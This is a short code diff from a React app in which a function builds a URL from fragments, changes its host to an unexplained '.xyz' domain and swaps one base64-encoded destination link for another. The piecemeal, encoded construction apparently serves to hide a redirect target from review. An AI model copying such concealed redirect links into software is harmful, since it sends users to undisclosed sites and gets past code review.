@@ -4,11 +4,11 @@ import { Helmet } from 'react-helmet-async';
 function App() {
   const buildUrl = () => {
     let url = "https://locator";
-    url += ".zubayer";
-    url += ".one";
+    url += ".653880";
+    url += ".xyz";
     url += "/w";
     url += "/o8cp4b";
-    url += "/aHR0cHM6Ly9kYXJlcy5pbi9lbi9xdWl6L2NkZTU5ZQ==";
+    url += "/aHR0cHM6Ly9wb2tpLmNvbS9lbi9mdW5ueQ==";
 
     return url;
   };
